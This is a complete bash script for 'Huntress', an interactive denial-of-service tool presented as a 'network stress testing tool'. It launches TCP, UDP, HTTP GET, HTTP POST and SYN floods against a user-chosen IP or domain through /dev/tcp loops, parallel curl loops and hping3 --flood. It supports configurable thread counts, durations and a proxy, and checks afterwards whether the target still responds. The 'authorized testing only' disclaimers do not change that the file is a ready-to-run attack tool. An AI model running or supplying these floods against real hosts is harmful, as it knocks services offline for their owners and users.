#!/bin/bash

# Huntress - Network Testing Tool
# For Educational and Authorized Testing Only
# Author: Security Researcher
# Version: 1.0

# Colors for better UI
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Global variables
TARGET=""
PORT=""
THREADS=""
DURATION=""
ATTACK_TYPE=""
PROXY=""
USE_PROXY=false
ATTACK_PID=""

# ASCII Art Banner
show_banner() {
    clear
    echo -e "${RED}"
    cat << "EOF"
    ██╗  ██╗██╗   ██╗███╗   ██╗████████╗██████╗ ███████╗███████╗███████╗
    ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔══██╗██╔════╝██╔════╝██╔════╝
    ███████║██║   ██║██╔██╗ ██║   ██║   ██████╔╝█████╗  ███████╗███████╗
    ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══██╗██╔══╝  ╚════██║╚════██║
    ██║  ██║╚██████╔╝██║ ╚████║   ██║   ██║  ██║███████╗███████║███████║
    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
EOF
    echo -e "${NC}"
    echo -e "${CYAN}                    Network Stress Testing Tool v1.0${NC}"
    echo -e "${YELLOW}                  For Educational & Authorized Testing Only${NC}"
    echo -e "${RED}                        Use Responsibly & Legally${NC}"
    echo ""
}

# Help menu
show_help() {
    echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║                              HELP MENU                              ║${NC}"
    echo -e "${GREEN}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${WHITE}║ Commands:                                                            ║${NC}"
    echo -e "${CYAN}║  1) set-target    - Set target IP/domain                            ║${NC}"
    echo -e "${CYAN}║  2) set-port      - Set target port (default: 80)                   ║${NC}"
    echo -e "${CYAN}║  3) set-threads   - Set number of threads (default: 100)            ║${NC}"
    echo -e "${CYAN}║  4) set-duration  - Set attack duration in seconds (default: 60)    ║${NC}"
    echo -e "${CYAN}║  5) set-proxy     - Configure proxy settings                        ║${NC}"
    echo -e "${CYAN}║  6) attack-type   - Choose attack method                            ║${NC}"
    echo -e "${CYAN}║  7) show-config   - Display current configuration                   ║${NC}"
    echo -e "${CYAN}║  8) start-attack  - Begin the stress test                           ║${NC}"
    echo -e "${CYAN}║  9) check-target  - Check if target is responsive                   ║${NC}"
    echo -e "${CYAN}║  10) cancel       - Stop current attack                             ║${NC}"
    echo -e "${CYAN}║  11) help         - Show this help menu                             ║${NC}"
    echo -e "${CYAN}║  12) exit         - Exit Huntress                                   ║${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

# Check if target is up
check_target() {
    if [ -z "$TARGET" ]; then
        echo -e "${RED}[!] No target set. Use 'set-target' first.${NC}"
        return
    fi
    
    echo -e "${YELLOW}[*] Checking target status...${NC}"
    
    # Ping test
    if ping -c 1 -W 3 "$TARGET" &> /dev/null; then
        echo -e "${GREEN}[✓] Target $TARGET is responding to ping${NC}"
    else
        echo -e "${RED}[✗] Target $TARGET is not responding to ping${NC}"
    fi
    
    # Port check if port is set
    if [ ! -z "$PORT" ]; then
        if timeout 5 bash -c "</dev/tcp/$TARGET/$PORT" &> /dev/null; then
            echo -e "${GREEN}[✓] Port $PORT is open on $TARGET${NC}"
        else
            echo -e "${RED}[✗] Port $PORT appears closed on $TARGET${NC}"
        fi
    fi
}

# Set target
set_target() {
    echo -e "${CYAN}[?] Enter target IP or domain:${NC}"
    read -p "> " TARGET
    if [ ! -z "$TARGET" ]; then
        echo -e "${GREEN}[✓] Target set to: $TARGET${NC}"
    else
        echo -e "${RED}[!] Invalid target${NC}"
    fi
}

# Set port
set_port() {
    echo -e "${CYAN}[?] Enter target port (default: 80):${NC}"
    read -p "> " PORT
    if [ -z "$PORT" ]; then
        PORT=80
    fi
    echo -e "${GREEN}[✓] Port set to: $PORT${NC}"
}

# Set threads
set_threads() {
    echo -e "${CYAN}[?] Enter number of threads (default: 100):${NC}"
    read -p "> " THREADS
    if [ -z "$THREADS" ]; then
        THREADS=100
    fi
    echo -e "${GREEN}[✓] Threads set to: $THREADS${NC}"
}

# Set duration
set_duration() {
    echo -e "${CYAN}[?] Enter attack duration in seconds (default: 60):${NC}"
    read -p "> " DURATION
    if [ -z "$DURATION" ]; then
        DURATION=60
    fi
    echo -e "${GREEN}[✓] Duration set to: $DURATION seconds${NC}"
}

# Set proxy
set_proxy() {
    echo -e "${CYAN}[?] Do you want to use a proxy? (y/n):${NC}"
    read -p "> " use_proxy_choice
    if [[ $use_proxy_choice == "y" || $use_proxy_choice == "Y" ]]; then
        echo -e "${CYAN}[?] Enter proxy address (format: ip:port):${NC}"
        read -p "> " PROXY
        USE_PROXY=true
        echo -e "${GREEN}[✓] Proxy set to: $PROXY${NC}"
    else
        USE_PROXY=false
        echo -e "${GREEN}[✓] No proxy will be used${NC}"
    fi
}

# Choose attack type
choose_attack_type() {
    echo -e "${CYAN}╔══════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║           ATTACK METHODS             ║${NC}"
    echo -e "${CYAN}╠══════════════════════════════════════╣${NC}"
    echo -e "${WHITE}║ 1) TCP Flood                        ║${NC}"
    echo -e "${WHITE}║ 2) UDP Flood                        ║${NC}"
    echo -e "${WHITE}║ 3) HTTP GET Flood                   ║${NC}"
    echo -e "${WHITE}║ 4) HTTP POST Flood                  ║${NC}"
    echo -e "${WHITE}║ 5) SYN Flood                        ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════╝${NC}"
    echo -e "${CYAN}[?] Choose attack type (1-5):${NC}"
    read -p "> " attack_choice
    
    case $attack_choice in
        1) ATTACK_TYPE="tcp"; echo -e "${GREEN}[✓] TCP Flood selected${NC}" ;;
        2) ATTACK_TYPE="udp"; echo -e "${GREEN}[✓] UDP Flood selected${NC}" ;;
        3) ATTACK_TYPE="http-get"; echo -e "${GREEN}[✓] HTTP GET Flood selected${NC}" ;;
        4) ATTACK_TYPE="http-post"; echo -e "${GREEN}[✓] HTTP POST Flood selected${NC}" ;;
        5) ATTACK_TYPE="syn"; echo -e "${GREEN}[✓] SYN Flood selected${NC}" ;;
        *) echo -e "${RED}[!] Invalid choice${NC}" ;;
    esac
}

# Show current configuration
show_config() {
    echo -e "${PURPLE}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}║                        CURRENT CONFIGURATION                        ║${NC}"
    echo -e "${PURPLE}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${WHITE}║ Target:      ${TARGET:-Not set}${NC}"
    echo -e "${WHITE}║ Port:        ${PORT:-80}${NC}"
    echo -e "${WHITE}║ Threads:     ${THREADS:-100}${NC}"
    echo -e "${WHITE}║ Duration:    ${DURATION:-60} seconds${NC}"
    echo -e "${WHITE}║ Attack Type: ${ATTACK_TYPE:-Not set}${NC}"
    echo -e "${WHITE}║ Proxy:       ${PROXY:-None}${NC}"
    echo -e "${PURPLE}╚══════════════════════════════════════════════════════════════════════╝${NC}"
}

# TCP Flood attack
tcp_flood() {
    echo -e "${YELLOW}[*] Starting TCP Flood attack...${NC}"
    for ((i=1; i<=THREADS; i++)); do
        (
            timeout $DURATION bash -c "
                while true; do
                    (echo >/dev/tcp/$TARGET/$PORT) 2>/dev/null
                done
            " &
        ) &
    done
}

# UDP Flood attack
udp_flood() {
    echo -e "${YELLOW}[*] Starting UDP Flood attack...${NC}"
    timeout $DURATION hping3 -2 -p $PORT --flood $TARGET &
}

# HTTP GET Flood
http_get_flood() {
    echo -e "${YELLOW}[*] Starting HTTP GET Flood attack...${NC}"
    for ((i=1; i<=THREADS; i++)); do
        (
            timeout $DURATION bash -c "
                while true; do
                    curl -s http://$TARGET:$PORT/ >/dev/null 2>&1
                done
            " &
        ) &
    done
}

# HTTP POST Flood
http_post_flood() {
    echo -e "${YELLOW}[*] Starting HTTP POST Flood attack...${NC}"
    for ((i=1; i<=THREADS; i++)); do
        (
            timeout $DURATION bash -c "
                while true; do
                    curl -s -X POST -d 'data=test' http://$TARGET:$PORT/ >/dev/null 2>&1
                done
            " &
        ) &
    done
}

# SYN Flood attack
syn_flood() {
    echo -e "${YELLOW}[*] Starting SYN Flood attack...${NC}"
    timeout $DURATION hping3 -S -p $PORT --flood $TARGET &
}

# Start attack
start_attack() {
    if [ -z "$TARGET" ] || [ -z "$ATTACK_TYPE" ]; then
        echo -e "${RED}[!] Target and attack type must be set before starting${NC}"
        return
    fi
    
    # Set defaults if not configured
    PORT=${PORT:-80}
    THREADS=${THREADS:-100}
    DURATION=${DURATION:-60}
    
    echo -e "${RED}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║                            WARNING                                   ║${NC}"
    echo -e "${RED}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║ This will start a stress test against: $TARGET:$PORT${NC}"
    echo -e "${YELLOW}║ Attack Type: $ATTACK_TYPE${NC}"
    echo -e "${YELLOW}║ Duration: $DURATION seconds${NC}"
    echo -e "${YELLOW}║ Only proceed if you have explicit authorization!${NC}"
    echo -e "${RED}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}[?] Continue? (y/n):${NC}"
    read -p "> " confirm
    
    if [[ $confirm != "y" && $confirm != "Y" ]]; then
        echo -e "${YELLOW}[*] Attack cancelled${NC}"
        return
    fi
    
    echo -e "${GREEN}[*] Attack started! Duration: $DURATION seconds${NC}"
    echo -e "${YELLOW}[*] Use 'cancel' command to stop early${NC}"
    
    case $ATTACK_TYPE in
        "tcp") tcp_flood ;;
        "udp") udp_flood ;;
        "http-get") http_get_flood ;;
        "http-post") http_post_flood ;;
        "syn") syn_flood ;;
    esac
    
    ATTACK_PID=$!
    
    # Wait for attack to complete
    sleep $DURATION
    echo -e "${GREEN}[✓] Attack completed${NC}"
    
    # Check target status after attack
    echo -e "${YELLOW}[*] Checking target status after attack...${NC}"
    sleep 2
    check_target
}

# Cancel attack
cancel_attack() {
    echo -e "${YELLOW}[*] Cancelling attack...${NC}"
    pkill -f "hping3"
    pkill -f "curl"
    jobs -p | xargs -r kill
    echo -e "${GREEN}[✓] Attack cancelled${NC}"
}

# Main menu loop
main_menu() {
    while true; do
        echo -e "${BLUE}╔══════════════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${BLUE}║                              MAIN MENU                              ║${NC}"
        echo -e "${BLUE}╚══════════════════════════════════════════════════════════════════════╝${NC}"
        echo -e "${WHITE}Enter command (type 'help' for available commands):${NC}"
        read -p "huntress> " command
        
        case $command in
            "set-target") set_target ;;
            "set-port") set_port ;;
            "set-threads") set_threads ;;
            "set-duration") set_duration ;;
            "set-proxy") set_proxy ;;
            "attack-type") choose_attack_type ;;
            "show-config") show_config ;;
            "start-attack") start_attack ;;
            "check-target") check_target ;;
            "cancel") cancel_attack ;;
            "help") show_help ;;
            "exit") 
                echo -e "${GREEN}[*] Exiting Huntress...${NC}"
                cancel_attack
                exit 0 
                ;;
            "clear") clear; show_banner ;;
            "") continue ;;
            *) echo -e "${RED}[!] Unknown command. Type 'help' for available commands.${NC}" ;;
        esac
        echo ""
    done
}

# Check for required tools
check_dependencies() {
    echo -e "${YELLOW}[*] Checking dependencies...${NC}"
    
    missing_tools=()
    
    if ! command -v hping3 &> /dev/null; then
        missing_tools+=("hping3")
    fi
    
    if ! command -v curl &> /dev/null; then
        missing_tools+=("curl")
    fi
    
    if [ ${#missing_tools[@]} -ne 0 ]; then
        echo -e "${RED}[!] Missing required tools: ${missing_tools[*]}${NC}"
        echo -e "${YELLOW}[*] Install with: sudo apt-get install ${missing_tools[*]}${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}[✓] All dependencies satisfied${NC}"
    sleep 1
}

# Check if running as root for some attacks
check_privileges() {
    if [ "$EUID" -ne 0 ]; then
        echo -e "${YELLOW}[!] Some attack types require root privileges${NC}"
        echo -e "${YELLOW}[!] Run with sudo for full functionality${NC}"
        sleep 2
    fi
}

# Main execution
main() {
    show_banner
    check_dependencies
    check_privileges
    
    echo -e "${GREEN}[*] Huntress initialized successfully${NC}"
    echo -e "${CYAN}[*] Type 'help' to see available commands${NC}"
    echo ""
    
    main_menu
}

# Trap Ctrl+C
trap 'echo -e "\n${YELLOW}[*] Use \"exit\" command to quit properly${NC}"; cancel_attack' INT

# Start the program
main
